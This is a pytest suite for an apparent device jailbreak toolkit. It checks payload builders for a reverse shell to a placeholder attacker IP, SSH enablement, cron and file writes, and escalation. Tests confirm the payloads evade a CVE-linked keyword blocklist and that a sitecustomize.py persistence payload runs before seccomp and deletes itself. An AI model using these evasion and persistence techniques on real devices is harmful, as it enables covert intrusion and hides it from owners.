"""Tests for webrtc_payloads.py — keyword filter, UUID format, syntax, and registry consistency."""

import pytest

from unleash_lite.webrtc_payloads import (
    PAYLOAD_REGISTRY,
    PROGACTUATOR_ILLEGAL_KEYWORDS,
    validate_bypass_payload,
    validate_uuid_format,
    payload_ssh,
    payload_reverse_shell,
    payload_custom,
    payload_ssh_persist,
    payload_bypass_hosts,
    payload_bypass_file,
    payload_bypass_cron,
    payload_bypass_escalate,
    payload_bypass_ssh,
    payload_sitecustomize_ssh,
    payload_init_ssh_persist,
)
from unleash_lite.__main__ import _JAILBREAK_MODES


BYPASS_BUILDERS = {
    "bypass-hosts": lambda: payload_bypass_hosts(attacker_ip="10.0.0.1"),
    "bypass-file": lambda: payload_bypass_file(
        file_path="/tmp/test.txt", content="hello\nworld"),
    "bypass-cron": lambda: payload_bypass_cron(command="id"),
    "bypass-escalate": lambda: payload_bypass_escalate(
        unfiltered_code="import os\nos.system('id')"),
    "bypass-ssh": lambda: payload_bypass_ssh(),
    "init-ssh": lambda: payload_sitecustomize_ssh(),
    "init-ssh-persist": lambda: payload_init_ssh_persist(),
}

ALL_BUILDERS = {
    "ssh": lambda: payload_ssh(),
    "reverse-shell": lambda: payload_reverse_shell(attacker_ip="10.0.0.1"),
    "custom": lambda: payload_custom(command="id"),
    "ssh-persist": lambda: payload_ssh_persist(),
    **BYPASS_BUILDERS,
}


class TestKeywordFilter:
    """Every bypass payload must pass the CVE-2026-27509 keyword blocklist."""

    @pytest.mark.parametrize("mode", BYPASS_BUILDERS.keys())
    def test_bypass_payload_passes_filter(self, mode):
        payload = BYPASS_BUILDERS[mode]()
        ok, kw = validate_bypass_payload(payload.python_code)
        assert ok, f"{mode} payload blocked by keyword: {kw!r}"

    def test_blocklist_is_nonempty(self):
        assert len(PROGACTUATOR_ILLEGAL_KEYWORDS) > 100

    def test_validate_catches_known_keyword(self):
        ok, kw = validate_bypass_payload("import os")
        assert not ok
        assert kw == "import"


class TestUUIDFormat:
    """Bypass payloads must produce 10-digit numeric UUIDs for firmware 1.0.5.5+."""

    @pytest.mark.parametrize("mode", BYPASS_BUILDERS.keys())
    def test_uuid_is_10_digits(self, mode):
        payload = BYPASS_BUILDERS[mode]()
        assert validate_uuid_format(payload.program_uuid), (
            f"{mode} UUID {payload.program_uuid!r} is not 10 digits")


class TestSyntax:
    """Generated Python code must be syntactically valid."""

    @pytest.mark.parametrize("mode", ALL_BUILDERS.keys())
    def test_code_compiles(self, mode):
        payload = ALL_BUILDERS[mode]()
        try:
            compile(payload.python_code, f"<{mode}>", "exec")
        except SyntaxError as e:
            pytest.fail(f"{mode} payload has invalid syntax: {e}")


class TestRegistryConsistency:
    """PAYLOAD_REGISTRY and _JAILBREAK_MODES must stay in sync."""

    def test_registry_keys_match_cli_modes(self):
        registry_keys = set(PAYLOAD_REGISTRY.keys())
        cli_modes = set(_JAILBREAK_MODES)
        assert registry_keys == cli_modes, (
            f"Registry vs CLI mismatch.\n"
            f"  In registry but not CLI: {registry_keys - cli_modes}\n"
            f"  In CLI but not registry: {cli_modes - registry_keys}")

    def test_registry_callables(self):
        for name, (desc, fn) in PAYLOAD_REGISTRY.items():
            assert callable(fn), f"{name}: function is not callable"
            assert isinstance(desc, str) and len(desc) > 0, (
                f"{name}: description is empty")


class TestPayloadFields:
    """Every payload must have required fields populated."""

    @pytest.mark.parametrize("mode", ALL_BUILDERS.keys())
    def test_has_name_and_description(self, mode):
        payload = ALL_BUILDERS[mode]()
        assert payload.name, f"{mode}: name is empty"
        assert payload.description, f"{mode}: description is empty"
        assert len(payload.python_code) > 0, f"{mode}: python_code is empty"

    @pytest.mark.parametrize("mode", ALL_BUILDERS.keys())
    def test_hotkey_default(self, mode):
        payload = ALL_BUILDERS[mode]()
        assert payload.bind_hotkey == "L1+Y"


class TestWrittenFileContent:
    """Validate content that payload_bypass_file / init-ssh writes to the target filesystem.

    The upload payload itself is syntactically valid Python, but the *content
    it writes* (e.g. sitecustomize.py) must also be valid or the exploit silently
    fails. These tests decode the encoded string from the generated code and
    compile it directly.
    """

    def test_init_ssh_sitecustomize_content_compiles(self):
        payload = payload_sitecustomize_ssh()
        # First line of generated code: _c = str(bytes([...]), 'utf-8')
        ns = {}
        exec(payload.python_code.split('\n')[0], ns)
        content = ns['_c']
        try:
            compile(content, '<sitecustomize.py>', 'exec')
        except SyntaxError as e:
            pytest.fail(
                f"sitecustomize.py content has invalid syntax: {e}\n"
                f"Content: {content!r}")

    def test_init_ssh_content_starts_sshd(self):
        payload = payload_sitecustomize_ssh(password="testpass")
        ns = {}
        exec(payload.python_code.split('\n')[0], ns)
        content = ns['_c']
        assert "sshd" in content
        assert "chpasswd" in content
        assert "testpass" in content

    def test_bypass_file_content_roundtrip(self):
        np = pytest.importorskip("numpy")
        original = "hello\nworld\nthird line"
        payload = payload_bypass_file(file_path="/tmp/t.txt", content=original)
        lines = []
        def fake_savetxt(path, arr, fmt):
            lines.extend(arr.tolist())
        ns = {"np": type("np", (), {"savetxt": staticmethod(fake_savetxt),
                                    "array": staticmethod(np.array)})()}
        exec(payload.python_code, ns)
        assert "\n".join(lines) == original


def _decode_first_encoded_str(payload, var_name):
    """Helper: extract the first `var_name = str(bytes([...]), 'utf-8')` line
    from a generated bypass payload and decode the value."""
    first_line = next(
        l for l in payload.python_code.split("\n") if l.startswith(f"{var_name} = ")
    )
    ns = {}
    exec(first_line, ns)
    return ns[var_name]


class TestInitSshPersistWrittenContent:
    """The sitecustomize.py written by init-ssh-persist runs pre-seccomp, so
    the blocklist does NOT apply to it. But it must still be valid Python and
    must do the install + self-remove correctly."""

    def _get_sitecustomize(self):
        return _decode_first_encoded_str(payload_init_ssh_persist(), "_sc")

    def _get_guard_script(self):
        return _decode_first_encoded_str(payload_init_ssh_persist(), "_g")

    def test_sitecustomize_content_compiles(self):
        try:
            compile(self._get_sitecustomize(), "<sitecustomize.py>", "exec")
        except SyntaxError as e:
            pytest.fail(
                f"sitecustomize.py content has invalid syntax: {e}\n"
                f"Content: {self._get_sitecustomize()!r}")

    def test_sitecustomize_runs_ssh_guard_install(self):
        content = self._get_sitecustomize()
        assert "ssh_guard.sh" in content
        assert "install" in content
        assert "chmod" in content

    def test_sitecustomize_self_removes_all_paths(self):
        content = self._get_sitecustomize()
        for path in (
            "/usr/lib/python3.8/sitecustomize.py",
            "/usr/lib/python3.10/sitecustomize.py",
            "/usr/lib/python3.11/sitecustomize.py",
            "/usr/local/lib/python3.8/dist-packages/sitecustomize.py",
        ):
            assert path in content, f"{path} not in sitecustomize.py content"
        assert "os.unlink" in content

    def test_written_guard_script_matches_ssh_guard_constant(self):
        from unleash_lite.webrtc_payloads import SSH_GUARD_SCRIPT
        assert self._get_guard_script() == SSH_GUARD_SCRIPT

    def test_payload_writes_guard_to_usr_local_bin(self):
        np = pytest.importorskip("numpy")
        written = {}
        def fake_savetxt(path, arr, fmt):
            written[path] = "\n".join(arr.tolist())
        ns = {"np": type("np", (), {"savetxt": staticmethod(fake_savetxt),
                                    "array": staticmethod(np.array)})()}
        exec(payload_init_ssh_persist().python_code, ns)
        assert "/usr/local/bin/ssh_guard.sh" in written
        assert "# ssh_guard.sh" in written["/usr/local/bin/ssh_guard.sh"]
